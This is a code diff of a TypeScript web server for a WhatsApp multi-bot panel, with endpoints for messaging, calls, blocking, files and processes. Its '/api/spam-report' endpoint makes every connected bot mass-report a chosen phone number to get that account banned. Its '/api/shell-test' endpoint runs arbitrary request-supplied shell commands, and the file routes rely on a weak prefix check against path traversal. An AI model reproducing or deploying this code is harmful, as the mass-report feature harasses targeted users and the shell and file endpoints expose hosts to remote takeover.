-        const chat = ensureBotChatMap(botKey).get(jid);
-        const quotedObj = quotedId ? chat?.messages.find((x) => x.id === quotedId) : undefined;
-        const sendOpts = quotedObj?.rawMessage ? { quoted: quotedObj.rawMessage } : undefined;
-        const origSend = state.originalSenders.get(targetBot) || targetBot.sendMessage.bind(targetBot);
-
-        let payload: any = {};
+        let payload: any;
         let mediaKind: "image" | "sticker" | "video" | "audio" | "document" = "document";
 
-        if (asSticker || mimeType.includes("webp")) {
+        if (b.asSticker || mime.includes("webp")) {
           payload = { sticker: buf, mimetype: "image/webp" };
           mediaKind = "sticker";
-        } else if (isPtt || mimeType.startsWith("audio/")) {
-          payload = { audio: buf, mimetype: mimeType, ptt: isPtt };
+        } else if (b.isPtt || mime.startsWith("audio/")) {
+          payload = { audio: buf, mimetype: mime, ptt: Boolean(b.isPtt) };
           mediaKind = "audio";
-        } else if (mimeType.startsWith("image/")) {
-          payload = { image: buf, caption, mimetype: mimeType };
+        } else if (mime.startsWith("image/")) {
+          payload = { image: buf, caption, mimetype: mime };
           mediaKind = "image";
-        } else if (mimeType.startsWith("video/")) {
-          payload = { video: buf, caption, mimetype: mimeType };
+        } else if (mime.startsWith("video/")) {
+          payload = { video: buf, caption, mimetype: mime };
           mediaKind = "video";
         } else {
-          payload = { document: buf, fileName, mimetype: mimeType, caption };
+          payload = { document: buf, fileName: String(b.fileName || "archivo"), mimetype: mime, caption };
           mediaKind = "document";
         }
 
-        const sent = await origSend(jid, payload, sendOpts);
+        const sent = await orig(b.jid, payload, qObj?.rawMessage ? { quoted: qObj.rawMessage } : undefined);
         const msgId = sent?.key?.id || randomBytes(6).toString("hex");
-        saveMediaToStore(msgId, mediaKind === "sticker" ? "image/webp" : mimeType, buf);
+        const finalMime = mediaKind === "sticker" ? "image/webp" : mime;
+
+        state.mediaStore.set(msgId, { mime: finalMime, buffer: buf, createdAt: Date.now() });
+        if (state.mediaStore.size > 120) {
+          const oldest = state.mediaStore.keys().next().value;
+          if (oldest) state.mediaStore.delete(oldest);
+        }
         state.msgTx++;
 
-        recordChatMessage(botKey, jid, {
+        const store = getChatStore(String(b.botKey));
+        const isGroup = String(b.jid).endsWith("@g.us");
+        const cleanRemote = String(b.jid).split("@")[0].split(":")[0];
+        const nowTs = Date.now();
+        const timeStr = new Date(nowTs).toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit" });
+        let chatSession = store.get(String(b.jid));
+        if (!chatSession) {
+          chatSession = {
+            jid: String(b.jid),
+            name: isGroup ? `Grupo ${cleanRemote}` : `+${cleanRemote}`,
+            isGroup,
+            unread: 0,
+            lastTime: nowTs,
+            lastPreview: caption || `[${mediaKind.toUpperCase()}]`,
+            messages: [],
+          };
+          store.set(String(b.jid), chatSession);
+        }
+        const newMsg = {
           id: msgId,
-          sender: botKey,
-          pushName: targetBot?.user?.name || "SubBot",
+          sender: String(b.botKey),
+          pushName: bot?.user?.name || "SubBot",
           text: caption || (mediaKind === "audio" ? "🎤 Nota de voz" : ""),
+          time: timeStr,
+          timestamp: nowTs,
           fromMe: true,
-          timestamp: Date.now(),
           mediaType: mediaKind,
-          mediaMime: mimeType,
+          mediaMime: finalMime,
           hasMedia: true,
+          quotedId: qObj?.id || "",
+          quotedSender: qObj?.sender || "",
+          quotedText: qObj?.text || "",
+          reactions: {},
           rawKey: sent?.key,
           rawMessage: sent,
-        });
+        };
+        chatSession.lastTime = nowTs;
+        chatSession.lastPreview = (caption || `[${mediaKind.toUpperCase()}]`).slice(0, 70);
+        chatSession.messages.push(newMsg);
+        state.msgLookup?.set(msgId, { botKey: String(b.botKey), msg: newMsg });
 
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/wa-action" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const action = String(body.action || "");
-        const botKey = String(body.botKey || "");
-        const jid = String(body.jid || "");
-        const msgId = String(body.msgId || "");
+        const b = await readJson(req);
+        const action = String(b.action || "");
+        const botKey = String(b.botKey || "");
+        const jid = String(b.jid || "");
+        const msgId = String(b.msgId || "");
 
-        const allBots = getAllBotSockets();
-        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
-        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : null;
-        if (!targetBot) {
-          sendJson(res, 404, { ok: false, error: "Subbot no disponible" });
-          return;
-        }
+        const { bot } = findBot(botKey);
+        if (!bot) return sendJson(res, 404, { ok: false, error: "Subbot no disponible" });
 
-        const origSend = state.originalSenders.get(targetBot) || targetBot.sendMessage.bind(targetBot);
-        const chat = ensureBotChatMap(botKey).get(jid);
+        const orig = state.originalSenders.get(bot) || bot.sendMessage.bind(bot);
+        const chat = getChatStore(botKey).get(jid);
         const targetMsg = chat?.messages.find((x) => x.id === msgId);
 
         if (action === "react" && targetMsg?.rawKey) {
-          const emoji = String(body.emoji || "❤️");
-          await origSend(jid, { react: { text: emoji, key: targetMsg.rawKey } });
+          const emoji = String(b.emoji || "❤️");
+          await orig(jid, { react: { text: emoji, key: targetMsg.rawKey } });
           if (!targetMsg.reactions) targetMsg.reactions = {};
           targetMsg.reactions[botKey] = emoji;
-          sendJson(res, 200, { ok: true });
-          return;
+          return sendJson(res, 200, { ok: true });
         }
 
         if (action === "delete" && targetMsg?.rawKey) {
-          await origSend(jid, { delete: targetMsg.rawKey });
+          await orig(jid, { delete: targetMsg.rawKey });
           targetMsg.text = "🚫 Eliminaste este mensaje";
           targetMsg.mediaType = null;
-          sendJson(res, 200, { ok: true });
-          return;
+          return sendJson(res, 200, { ok: true });
         }
 
-        if (action === "presence" && typeof targetBot.sendPresenceUpdate === "function") {
-          await targetBot.sendPresenceUpdate(body.presence || "composing", jid).catch(() => {});
-          sendJson(res, 200, { ok: true });
-          return;
+        if (action === "presence" && typeof bot.sendPresenceUpdate === "function") {
+          await bot.sendPresenceUpdate(b.presence || "composing", jid).catch(() => {});
+          return sendJson(res, 200, { ok: true });
         }
 
-        if ((action === "block" || action === "unblock") && typeof targetBot.updateBlockStatus === "function") {
-          await targetBot.updateBlockStatus(jid, action);
-          sendJson(res, 200, { ok: true });
-          return;
+        if ((action === "block" || action === "unblock") && typeof bot.updateBlockStatus === "function") {
+          await bot.updateBlockStatus(jid, action);
+          return sendJson(res, 200, { ok: true });
         }
 
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/wa-call" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const action = String(body.action || "");
+        const b = await readJson(req);
+        const action = String(b.action || "");
 
         if (action === "toggle-autoreject") {
           state.autoRejectCalls = !state.autoRejectCalls;
-          sendJson(res, 200, { ok: true, autoRejectCalls: state.autoRejectCalls });
-          return;
+          return sendJson(res, 200, { ok: true, autoRejectCalls: state.autoRejectCalls });
         }
 
         if (action === "set-message") {
-          state.autoRejectMessage = String(body.message || "");
-          sendJson(res, 200, { ok: true });
-          return;
+          state.autoRejectMessage = String(b.message || "");
+          return sendJson(res, 200, { ok: true });
         }
 
         if (action === "clear-logs") {
           state.callLogs = [];
-          sendJson(res, 200, { ok: true });
-          return;
+          return sendJson(res, 200, { ok: true });
         }
 
-        const botKey = String(body.botKey || "");
-        const peerJid = String(body.peerJid || "");
-        const allBots = getAllBotSockets();
-        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
-        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : allBots[0];
-
-        if (!targetBot) {
-          sendJson(res, 404, { ok: false, error: "Subbot no encontrado" });
-          return;
-        }
+        const botKey = String(b.botKey || "");
+        const peerJid = String(b.peerJid || "");
+        const { bot } = findBot(botKey);
+        if (!bot) return sendJson(res, 404, { ok: false, error: "Subbot no encontrado" });
 
         if (action === "reject") {
-          const callId = String(body.callId || "");
-          if (typeof targetBot.rejectCall === "function" && callId && peerJid) {
-            await targetBot.rejectCall(callId, peerJid).catch(() => {});
+          const callId = String(b.callId || "");
+          if (typeof bot.rejectCall === "function" && callId && peerJid) {
+            await bot.rejectCall(callId, peerJid).catch(() => {});
           }
           const logItem = state.callLogs.find((x) => x.id === callId);
           if (logItem) logItem.status = "reject";
-          sendJson(res, 200, { ok: true });
-          return;
+          return sendJson(res, 200, { ok: true });
         }
 
         if (action === "offer" && peerJid) {
-          const isVideo = Boolean(body.isVideo);
+          const isVideo = Boolean(b.isVideo);
           const callId = randomBytes(8).toString("hex").toUpperCase();
           const now = Date.now();
           const timeStr = new Date(now).toLocaleTimeString("es-CO", {
@@ -3145,32 +1560,29 @@ async function ensureWebServerRunning(): Promise<number> {
             second: "2-digit",
           });
 
-          try {
-            if (typeof targetBot.query === "function") {
-              await targetBot
-                .query({
-                  tag: "call",
-                  attrs: {
-                    to: peerJid,
-                    id: callId,
-                  },
-                  content: [
-                    {
-                      tag: "offer",
-                      attrs: {
-                        "call-id": callId,
-                        "call-creator": targetBot?.user?.id || `${botKey}@s.whatsapp.net`,
-                      },
-                      content: isVideo ? [{ tag: "video", attrs: {} }] : [{ tag: "audio", attrs: { enc: "opus", rate: "16000" } }],
+          if (typeof bot.query === "function") {
+            await bot
+              .query({
+                tag: "call",
+                attrs: { to: peerJid, id: callId },
+                content: [
+                  {
+                    tag: "offer",
+                    attrs: {
+                      "call-id": callId,
+                      "call-creator": bot?.user?.id || `${botKey}@s.whatsapp.net`,
                     },
-                  ],
-                })
-                .catch(() => {});
-            }
-          } catch {}
+                    content: isVideo
+                      ? [{ tag: "video", attrs: {} }]
+                      : [{ tag: "audio", attrs: { enc: "opus", rate: "16000" } }],
+                  },
+                ],
+              })
+              .catch(() => {});
+          }
 
           const cleanPeer = peerJid.split("@")[0].split(":")[0];
-          const knownName = ensureBotChatMap(botKey).get(peerJid)?.name || `+${cleanPeer}`;
+          const knownName = getChatStore(botKey).get(peerJid)?.name || `+${cleanPeer}`;
 
           state.callLogs.unshift({
             id: callId,
@@ -3185,54 +1597,38 @@ async function ensureWebServerRunning(): Promise<number> {
             timeStr,
           });
 
-          recordChatMessage(botKey, peerJid, {
-            id: `call_out_${callId}`,
-            sender: botKey,
-            pushName: targetBot?.user?.name || "SubBot",
-            text: `${isVideo ? "📹 Videollamada" : "📞 Llamada de voz"} saliente iniciada desde el panel`,
-            fromMe: true,
-            timestamp: now,
-          });
-
-          sendJson(res, 200, { ok: true, callId });
-          return;
+          return sendJson(res, 200, { ok: true, callId });
         }
 
-        sendJson(res, 400, { ok: false, error: "Acción desconocida" });
-        return;
+        return sendJson(res, 400, { ok: false, error: "Acción desconocida" });
       }
 
       if (pathname === "/api/toggle-subbots" && req.method === "POST") {
         state.subbotsPaused = !state.subbotsPaused;
-        sendJson(res, 200, { paused: state.subbotsPaused });
-        return;
+        return sendJson(res, 200, { paused: state.subbotsPaused });
       }
 
       if (pathname === "/api/toggle-single-bot" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const botKey = String(body.botKey || "");
+        const b = await readJson(req);
+        const botKey = String(b.botKey || "");
         if (botKey) {
           if (state.pausedBotIds.has(botKey)) state.pausedBotIds.delete(botKey);
           else state.pausedBotIds.add(botKey);
         }
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/clean-ram" && req.method === "POST") {
         try {
-          if (typeof globalThis.gc === "function") {
-            globalThis.gc();
-          }
+          if (typeof globalThis.gc === "function") globalThis.gc();
         } catch {}
         const afterMb = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
-        sendJson(res, 200, { ok: true, afterMb });
-        return;
+        return sendJson(res, 200, { ok: true, afterMb });
       }
 
       if (pathname === "/api/kill-proc" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const pids: string[] = Array.isArray(body.pids) ? body.pids : [];
+        const b = await readJson(req);
+        const pids: string[] = Array.isArray(b.pids) ? b.pids : [];
         const killed: string[] = [];
         for (const p of pids) {
           const numPid = parseInt(String(p), 10);
@@ -3243,46 +1639,36 @@ async function ensureWebServerRunning(): Promise<number> {
             } catch {}
           }
         }
-        sendJson(res, 200, { ok: true, killed });
-        return;
+        return sendJson(res, 200, { ok: true, killed });
       }
 
       if (pathname === "/api/commands" && req.method === "GET") {
         const allCommands = await syncCommandInterceptors();
-        sendJson(res, 200, {
+        return sendJson(res, 200, {
           allCommands,
           blocked: Array.from(state.blockedCommands),
         });
-        return;
       }
 
       if (pathname === "/api/toggle-cmd" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const cmd = String(body.cmd || "").toLowerCase().trim();
+        const b = await readJson(req);
+        const cmd = String(b.cmd || "").toLowerCase().trim();
         if (cmd) {
           await syncCommandInterceptors();
-          if (state.blockedCommands.has(cmd)) {
-            state.blockedCommands.delete(cmd);
-          } else {
-            state.blockedCommands.add(cmd);
-          }
+          if (state.blockedCommands.has(cmd)) state.blockedCommands.delete(cmd);
+          else state.blockedCommands.add(cmd);
         }
-        sendJson(res, 200, { blocked: Array.from(state.blockedCommands) });
-        return;
+        return sendJson(res, 200, { blocked: Array.from(state.blockedCommands) });
       }
 
       if (pathname === "/api/spam-report" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const cleanPhone = String(body.phone || "").replace(/\D/g, "");
-        const cycles = Math.min(20, Math.max(1, parseInt(String(body.cycles || "5"), 10)));
-
-        if (!cleanPhone || cleanPhone.length < 7) {
-          sendJson(res, 400, { ok: false });
-          return;
-        }
+        const b = await readJson(req);
+        const cleanPhone = String(b.phone || "").replace(/\D/g, "");
+        const cycles = Math.min(20, Math.max(1, parseInt(String(b.cycles || "5"), 10)));
+        if (!cleanPhone || cleanPhone.length < 7) return sendJson(res, 400, { ok: false });
 
         const targetJid = `${cleanPhone}@s.whatsapp.net`;
-        const allBots = getAllBotSockets();
+        const allBots = [state.lastSock, ...(typeof getActiveSubBots === "function" ? getActiveSubBots() || [] : [])].filter(Boolean);
 
         if (!state.reportRegistry.has(cleanPhone)) {
           state.reportRegistry.set(cleanPhone, {
@@ -3296,8 +1682,8 @@ async function ensureWebServerRunning(): Promise<number> {
         const entry = state.reportRegistry.get(cleanPhone)!;
 
         await Promise.allSettled(
-          allBots.map(async (botSock, idx) => {
-            const botId = getBotKey(botSock, idx);
+          allBots.map(async (botSock: any, idx: number) => {
+            const botId = String(botSock?.user?.id || `bot_${idx}`).split("@")[0].split(":")[0];
             entry.subbotsUsed.add(botId);
 
             for (let i = 0; i < cycles; i++) {
@@ -3324,55 +1710,56 @@ async function ensureWebServerRunning(): Promise<number> {
           })
         );
 
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/files" && req.method === "GET") {
         const relDir = parsedUrl.searchParams.get("dir") || ".";
-        const targetDir = safeResolvePath(relDir);
-        const items = fs.readdirSync(targetDir, { withFileTypes: true });
+        const root = process.cwd();
+        const targetDir = path.resolve(root, relDir);
+        const safeDir = targetDir.startsWith(root) ? targetDir : root;
+        const items = fs.readdirSync(safeDir, { withFileTypes: true });
         const entries = items
           .filter((i) => i.name !== "node_modules" && i.name !== ".git")
           .map((i) => ({
             name: i.name,
             isDir: i.isDirectory(),
-            relPath: path.relative(process.cwd(), path.join(targetDir, i.name)) || ".",
+            relPath: path.relative(root, path.join(safeDir, i.name)) || ".",
           }))
           .sort((a, b) => Number(b.isDir) - Number(a.isDir));
 
-        sendJson(res, 200, { entries });
-        return;
+        return sendJson(res, 200, { entries });
       }
 
       if (pathname === "/api/file-read" && req.method === "GET") {
         const relFile = parsedUrl.searchParams.get("file") || "";
-        const targetFile = safeResolvePath(relFile);
-        if (fs.existsSync(targetFile) && fs.statSync(targetFile).isFile()) {
-          const content = fs.readFileSync(targetFile, "utf8");
-          sendJson(res, 200, { file: relFile, content });
-          return;
+        const root = process.cwd();
+        const targetFile = path.resolve(root, relFile);
+        const safeFile = targetFile.startsWith(root) ? targetFile : root;
+        if (fs.existsSync(safeFile) && fs.statSync(safeFile).isFile()) {
+          const content = fs.readFileSync(safeFile, "utf8");
+          return sendJson(res, 200, { file: relFile, content });
         }
-        sendJson(res, 404, { error: "Archivo no encontrado" });
-        return;
+        return sendJson(res, 404, { error: "Archivo no encontrado" });
       }
 
       if (pathname === "/api/file-save" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const relFile = String(body.file || "");
-        const content = String(body.content ?? "");
-        const targetFile = safeResolvePath(relFile);
-        fs.writeFileSync(targetFile, content, "utf8");
-        sendJson(res, 200, { ok: true });
-        return;
+        const b = await readJson(req);
+        const relFile = String(b.file || "");
+        const content = String(b.content ?? "");
+        const root = process.cwd();
+        const targetFile = path.resolve(root, relFile);
+        if (targetFile.startsWith(root)) {
+          fs.writeFileSync(targetFile, content, "utf8");
+          return sendJson(res, 200, { ok: true });
+        }
+        return sendJson(res, 403, { ok: false });
       }
 
       if (pathname === "/api/benchmark" && req.method === "POST") {
         const t0 = performance.now();
         let acc = 0;
-        for (let i = 0; i < 5_000_000; i++) {
-          acc += Math.sqrt(i);
-        }
+        for (let i = 0; i < 5_000_000; i++) acc += Math.sqrt(i);
         const cpuMs = (performance.now() - t0).toFixed(2);
 
         const t1 = performance.now();
@@ -3395,25 +1782,23 @@ async function ensureWebServerRunning(): Promise<number> {
           `Hilos / Núcleos CPU   : ${os.cpus().length} vCPU (${os.cpus()[0]?.model || "Generic"})`,
         ].join("\n");
 
-        sendJson(res, 200, { result: summary });
-        return;
+        return sendJson(res, 200, { result: summary });
       }
 
       if (pathname === "/api/shell-test" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const cmd = String(body.cmd || "uptime");
+        const b = await readJson(req);
+        const cmd = String(b.cmd || "uptime");
         try {
           const { stdout, stderr } = await execAsync(cmd, { timeout: 8000 });
-          sendJson(res, 200, { output: (stdout || stderr || "Ejecutado sin salida.").slice(0, 4000) });
+          return sendJson(res, 200, { output: (stdout || stderr || "Ejecutado sin salida.").slice(0, 4000) });
         } catch (err: any) {
-          sendJson(res, 200, { output: String(err?.message || err).slice(0, 4000) });
+          return sendJson(res, 200, { output: String(err?.message || err).slice(0, 4000) });
         }
-        return;
       }
 
-      sendJson(res, 404, { error: "Ruta no encontrada" });
+      return sendJson(res, 404, { error: "Ruta no encontrada" });
     } catch (e: any) {
-      sendJson(res, 500, { error: String(e?.message || e) });
+      return sendJson(res, 500, { error: String(e?.message || e) });
     }
   });
 
